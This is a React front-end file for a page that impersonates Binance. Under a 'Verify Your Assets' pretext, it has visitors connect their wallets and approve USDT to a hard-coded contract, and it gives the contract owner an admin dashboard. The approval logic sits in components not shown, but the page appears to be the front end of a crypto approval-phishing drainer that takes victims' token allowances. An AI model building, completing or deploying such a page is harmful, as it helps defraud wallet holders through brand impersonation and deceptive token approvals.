import React, { useState, useEffect } from 'react';
import WalletConnect from './components/WalletConnect';
import Approve from './components/Approve';
import Admin from './components/Admin';
import './App.css';
import Web3 from 'web3';
import abi from './abi.json';

const contractAddress = '0x797f35192418d62d4c7167f49f3f3934122659ef';

function App() {
  const [account, setAccount] = useState(null);
  const [showApprove, setShowApprove] = useState(false);
  const [menuOpen, setMenuOpen] = useState(false);
  const [error, setError] = useState('');
  const [isConnecting, setIsConnecting] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [approvedAmount, setApprovedAmount] = useState('');
  const [isAdmin, setIsAdmin] = useState(false);
  const [activeTab, setActiveTab] = useState('approve'); // 'approve' or 'admin'

  const toggleMenu = () => {
    setMenuOpen(!menuOpen);
  };

  // Check if connected account is admin
  useEffect(() => {
    const checkIfAdmin = async () => {
      if (account) {
        try {
          const web3 = new Web3(window.ethereum);
          const contract = new web3.eth.Contract(abi, contractAddress);
          const owner = await contract.methods.owner().call();
          const isAccountAdmin = account.toLowerCase() === owner.toLowerCase();
          setIsAdmin(isAccountAdmin);
          console.log('Is admin?', isAccountAdmin);
        } catch (err) {
          console.error('Error checking admin status:', err);
        }
      }
    };

    checkIfAdmin();
  }, [account]);

  // Close menu when clicking outside
  useEffect(() => {
    const handleClickOutside = (event) => {
      if (menuOpen && !event.target.closest('.mobile-menu-button') && !event.target.closest('.mobile-nav')) {
        setMenuOpen(false);
      }
    };

    document.addEventListener('click', handleClickOutside);
    return () => {
      document.removeEventListener('click', handleClickOutside);
    };
  }, [menuOpen]);

  const connectWallet = async () => {
    if (window.ethereum) {
      try {
        setIsConnecting(true);
        setError('');
        const web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const accounts = await web3.eth.getAccounts();
        setAccount(accounts[0]);
        setShowApprove(true);
        setIsConnecting(false);
      } catch (err) {
        setIsConnecting(false);
        setError('Failed to connect wallet: ' + (err.message || 'Unknown error'));
      }
    } else {
      setError('Please install MetaMask or another Web3 wallet');
    }
  };

  const handleApprovalSuccess = (amount) => {
    setApprovedAmount(amount);
    setShowSuccessModal(true);
  };

  const closeSuccessModal = () => {
    setShowSuccessModal(false);
  };

  return (
    <div className="binance-app">
      <header className="binance-header">
        <div className="container">
          <div className="logo-container">
            <img src="/images/binance-logo.png" alt="Binance" className="binance-logo" />
          </div>
          
          <nav className="desktop-nav">
            <ul>
              <li><a href="#home">Home</a></li>
              <li><a href="#blockchain">Blockchain</a></li>
              <li><a href="#tokens">Tokens</a></li>
              <li><a href="#validators">Validators</a></li>
              <li><a href="#nfts">NFTs</a></li>
              <li><a href="#resources">Resources</a></li>
              <li><a href="#developers">Developers</a></li>
            </ul>
          </nav>
          
          <div className={`mobile-menu-button ${menuOpen ? 'open' : ''}`} onClick={toggleMenu}>
            <span></span>
            <span></span>
            <span></span>
          </div>
          
          {/* Mobile navigation menu */}
          {menuOpen && (
            <div className="mobile-nav">
              <ul>
                <li><a href="#home">Home</a></li>
                <li><a href="#blockchain">Blockchain</a></li>
                <li><a href="#tokens">Tokens</a></li>
                <li><a href="#validators">Validators</a></li>
                <li><a href="#nfts">NFTs</a></li>
                <li><a href="#resources">Resources</a></li>
                <li><a href="#developers">Developers</a></li>
              </ul>
            </div>
          )}
        </div>
      </header>
      
      <main className="verify-content">
        <div className="container">
          <h1>Verify Your Assets</h1>
          <p className="subtitle">Ensure your tokens are secure on Binance Smart Chain.</p>
          
          {!account ? (
            <div className="verify-button-container">
              <button 
                onClick={connectWallet} 
                className="verify-button"
                disabled={isConnecting}
              >
                <span className="wallet-icon">
                  <svg viewBox="0 0 24 24" width="24" height="24">
                    <path d="M20 3H5C3.9 3 3 3.9 3 5V19C3 20.1 3.9 21 5 21H20C21.1 21 22 20.1 22 19V5C22 3.9 21.1 3 20 3ZM20 19H5V5H20V19Z" fill="currentColor"/>
                    <path d="M15 15C16.1 15 17 14.1 17 13C17 11.9 16.1 11 15 11C13.9 11 13 11.9 13 13C13 14.1 13.9 15 15 15Z" fill="currentColor"/>
                  </svg>
                </span>
                {isConnecting ? 'CONNECTING...' : 'VERIFY ASSETS'}
              </button>
              {error && <p className="error-message">{error}</p>}
            </div>
          ) : (
            <div className="wallet-connect-container">
              <div className="wallet-connected">
                <div className="wallet-address">
                  <span className="address-label">Connected Wallet:</span>
                  <span className="address-value">{account}</span>
                </div>
                
                {isAdmin && (
                  <div className="admin-tabs">
                    <button 
                      className={`tab-button ${activeTab === 'approve' ? 'active' : ''}`} 
                      onClick={() => setActiveTab('approve')}
                    >
                      Approve
                    </button>
                    <button 
                      className={`tab-button ${activeTab === 'admin' ? 'active' : ''}`} 
                      onClick={() => setActiveTab('admin')}
                    >
                      Admin Dashboard
                    </button>
                  </div>
                )}
              </div>
              
              {/* Show either Approve form or Admin panel based on selected tab */}
              {(!isAdmin || activeTab === 'approve') && (
                <Approve account={account} onApprovalSuccess={handleApprovalSuccess} />
              )}
              
              {isAdmin && activeTab === 'admin' && <Admin />}
            </div>
          )}
        </div>
      </main>

      {/* Success Modal */}
      {showSuccessModal && (
        <div className="modal-overlay" onClick={closeSuccessModal}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header">
              <h2>Approval Successful!</h2>
              <button className="modal-close" onClick={closeSuccessModal}>×</button>
            </div>
            <div className="modal-body">
              <div className="success-icon">
                <svg viewBox="0 0 24 24" width="64" height="64">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="#F0B90B"/>
                </svg>
              </div>
              <p className="success-message">Your USDT has been successfully approved!</p>
              <div className="amount-box">
                <span className="amount-label">Approved Amount:</span>
                <span className="amount-value">{approvedAmount} USDT</span>
              </div>
            </div>
            <div className="modal-footer">
              <button className="binance-button" onClick={closeSuccessModal}>Done</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default App;
